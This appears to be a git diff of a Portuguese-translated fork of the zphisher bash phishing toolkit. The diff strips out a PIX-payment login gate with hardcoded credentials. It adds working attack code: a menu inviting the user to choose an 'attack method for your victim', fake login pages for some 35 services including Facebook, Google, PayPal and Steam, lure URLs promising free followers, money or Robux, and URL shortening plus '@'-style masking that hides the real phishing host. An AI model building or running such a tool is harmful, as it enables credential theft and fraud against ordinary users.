@@ -5,6 +5,7 @@
 ##   Version 	: 	2.3.5
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
+
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
@@ -12,36 +13,6 @@
 ##
 
 __version__="2.3.5"
-
-### Inicio das modificações para aviso de pagamento e login
-
-# Exibe aviso de pagamento
-clear
-echo -e "\n\033[33m============================================\033[0m"
-echo -e "\033[31m       AVISO: Para usar esta ferramenta        \033[0m"
-echo -e "\033[31m   É necessário efetuar pagamento via PIX     \033[0m"
-echo -e "\033[32m    Chave PIX: 73999489515                    \033[0m"
-echo -e "\033[33m============================================\033[0m\n"
-
-# Solicita login de autenticação
-read -p "Usuário: " INPUT_USER
-read -s -p "Senha: " INPUT_PASS
-echo
-
-# Validação de credenciais
-if [[ "$INPUT_USER" != "Tranecck" ]] || [[ "$INPUT_PASS" != "12345" ]]; then
-    echo -e "\n\033[31m[!] Usuário ou senha incorretos. Encerrando.\033[0m"
-    exit 1
-fi
-
-echo -e "\n\033[32m[+] Login bem-sucedido! Liberando acesso à ferramenta...\033[0m\n"
-sleep 1
-
-# Descomente estas linhas para que o menu apareça pós‐login
-banner
-main_menu
-
-### Fim das modificações para aviso de pagamento e login
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -102,12 +73,12 @@ reset_color() {
 	return
 }
 
-## Kill já em execução
+## Kill already running process
 kill_pid() {
 	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Mata o processo
+			killall ${process} > /dev/null 2>&1 # Kill the Process
 		fi
 	done
 }
@@ -154,29 +125,38 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Versão : ${__version__}
+		${ORANGE}███████████           █████       ███          █████                         ███████████  ███████████  
+		${ORANGE}░█░░░░░░███           ░░███       ░░░          ░░███                         ░░███░░░░░███░░███░░░░░███ 
+		${ORANGE}░     ███░   ████████  ░███████   ████   █████  ░███████    ██████  ████████  ░███    ░███ ░███    ░███ 
+		${ORANGE}     ███    ░░███░░███ ░███░░███ ░░███  ███░░   ░███░░███  ███░░███░░███░░███ ░██████████  ░██████████  
+		${ORANGE}    ███      ░███ ░███ ░███ ░███  ░███ ░░█████  ░███ ░███ ░███████  ░███ ░░░  ░███░░░░░███ ░███░░░░░███ 
+		${ORANGE}  ████     █ ░███ ░███ ░███ ░███  ░███  ░░░░███ ░███ ░███ ░███░░░   ░███      ░███    ░███ ░███    ░███ 
+		${ORANGE} ███████████ ░███████  ████ █████ █████ ██████  ████ █████░░██████  █████     ███████████  █████   █████
+		${ORANGE}░░░░░░░░░░░  ░███░░░  ░░░░ ░░░░░ ░░░░░ ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░░░░░░░  ░░░░░   ░░░░░ 
+		${ORANGE}             ░███                                                                                       
+                ${ORANGE}             █████
+		${ORANGE}            ░░░░░                                                                                                                                                                           
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Ferramenta criada por Tranecck & tahmid.rayat${WHITE}
+		${ORANGE}              Ferramenta ZphisherBR
+		${ORANGE}                ${RED}Versão : ${__version__} TRADUZIDA PT-BR
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Criado por Tranecck & Tahmid.rayat${WHITE}
 	EOF
 }
 
-## Small Banner
 banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
+    cat <<- EOF
+${ORANGE} ▄███████▄     ▄███████▄    ▄████████    ▄█    █▄     ▄█     ▄████████    ▄█    █▄       ▄████████    ▄████████ ▀█████████▄     ▄████████ 
+${ORANGE}██▀     ▄██   ███    ███   ███    ███   ███    ███   ███    ███    ███   ███    ███     ███    ███   ███    ███   ███    ███   ███    ███ 
+${ORANGE}      ▄███▀   ███    ███   ███    █▀    ███    ███   ███▌   ███    █▀    ███    ███     ███    █▀    ███    ███   ███    ███   ███    ███ 
+${ORANGE} ▀█▀▄███▀▄▄   ███    ███   ███         ▄███▄▄▄▄███▄▄ ███▌   ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ 
+${ORANGE}  ▄███▀   ▀ ▀█████████▀  ▀███████████ ▀▀███▀▀▀▀███▀  ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   
+${ORANGE}▄███▀         ███                 ███   ███    ███   ███           ███   ███    ███     ███    █▄  ▀███████████   ███    ██▄ ▀███████████ 
+${ORANGE}███▄     ▄█   ███           ▄█    ███   ███    ███   ███     ▄█    ███   ███    ███     ███    ███   ███    ███   ███    ███   ███    ███ 
+${ORANGE} ▀████████▀  ▄████▀       ▄████████▀    ███    █▀    █▀    ▄████████▀    ███    █▀      ██████████   ███    ███ ▄█████████▀    ███    ███ 
+${ORANGE}                                                                                                     ███    ███                ███    ███ 
+    EOF
 }
+
 
 ## Dependencies
 dependencies() {
@@ -480,7 +460,7 @@ tunnel_menu() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione um serviço de encaminhamento de porta : ${BLUE}"
 
-	case $REPLY in
+	case $REPLY in 
 		1 | 01)
 			start_localhost;;
 		2 | 02)
@@ -491,6 +471,368 @@ tunnel_menu() {
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
 			{ sleep 1; tunnel_menu; };;
 	esac
-}  # <<< Fechamento da função tunnel_menu
+}
 
-# Fim do script
+## Custom Mask URL
+custom_mask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Deseja alterar a URL mascarada? ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" || ${mask_op,,} == "s" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Insira sua URL personalizada abaixo ${CYAN}(${ORANGE}Exemplo: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Usando URL mascarada personalizada :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Tipo de URL inválido.. Usando a padrão.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		processed_url=${short#http*//}
+	fi
+}
+
+custom_url() {
+	url=${1#http*//}
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+
+	{ custom_mask; sleep 1; clear; banner_small; }
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
+
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		url="Não foi possível gerar links. Tente ligar o hotspot"
+		processed_url="Não foi possível encurtar URL"
+	fi
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Não foi possível"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+}
+
+## Facebook
+site_facebook() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de login de votação avançada
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de login de segurança falsa
+		${RED}[${WHITE}04${RED}]${ORANGE} Página de login do Facebook Messenger
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="facebook"
+			mask='https://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="fb_advanced"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		3 | 03)
+			website="fb_security"
+			mask='https://make-your-facebook-secured-and-free-from-hackers'
+			tunnel_menu;;
+		4 | 04)
+			website="fb_messenger"
+			mask='https://get-messenger-premium-features-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			{ sleep 1; clear; banner_small; site_facebook; };;
+	esac
+}
+
+## Instagram
+site_instagram() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de login seguidores automáticos
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de login 1000 seguidores
+		${RED}[${WHITE}04${RED}]${ORANGE} Página de login verificação de selo azul
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="instagram"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		2 | 02)
+			website="ig_followers"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="insta_followers"
+			mask='https://get-1000-followers-for-instagram'
+			tunnel_menu;;
+		4 | 04)
+			website="ig_verify"
+			mask='https://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			{ sleep 1; clear; banner_small; site_instagram; };;
+	esac
+}
+
+## Gmail/Google
+site_gmail() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de login antiga do Gmail
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de login nova do Gmail
+		${RED}[${WHITE}03${RED}]${ORANGE} Votação avançada
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="google"
+			mask='https://get-unlimited-google-drive-free'
+			tunnel_menu;;		
+		2 | 02)
+			website="google_new"
+			mask='https://get-unlimited-google-drive-free'
+			tunnel_menu;;
+		3 | 03)
+			website="google_poll"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			{ sleep 1; clear; banner_small; site_gmail; };;
+	esac
+}
+
+## Vk
+site_vk() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de login de votação avançada
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="vk"
+			mask='https://vk-premium-real-method-2020'
+			tunnel_menu;;
+		2 | 02)
+			website="vk_poll"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			{ sleep 1; clear; banner_small; site_vk; };;
+	esac
+}
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Selecione um método de ataque para sua vítima ${RED}[${WHITE}::${RED}]${ORANGE}
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+
+		${RED}[${WHITE}99${RED}]${ORANGE} Sobre         ${RED}[${WHITE}00${RED}]${ORANGE} Sair
+
+	EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			site_facebook;;
+		2 | 02)
+			site_instagram;;
+		3 | 03)
+			site_gmail;;
+		4 | 04)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="paypal"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7 | 07)
+			website="steam"
+			mask='https://steam-500-usd-gift-card-free'
+			tunnel_menu;;
+		8 | 08)
+			website="twitter"
+			mask='https://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		9 | 09)
+			website="playstation"
+			mask='https://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
+		10)
+			website="tiktok"
+			mask='https://tiktok-free-liker'
+			tunnel_menu;;
+		11)
+			website="twitch"
+			mask='https://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		12)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		13)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		14)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		15)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		16)
+			website="quora"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		17)
+			website="protonmail"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		18)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		19)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		21)
+			website="deviantart"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		22)
+			website="badoo"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		23)
+			website="origin"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		24)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		25)
+			website="yahoo"
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		26)
+			website="wordpress"
+			mask='https://unlimited-wordpress-traffic-free'
+			tunnel_menu;;
+		27)
+			website="yandex"
+			mask='https://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		28)
+			website="stackoverflow"
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		29)
+			site_vk;;
+		30)
+			website="xbox"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='https://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='https://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='https://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		34)
+			website="discord"
+			mask='https://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="roblox"
+			mask='https://get-free-robux'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+## Main
+kill_pid
+dependencies
+check_status
+install_cloudflared
+install_localxpose
+main_menu
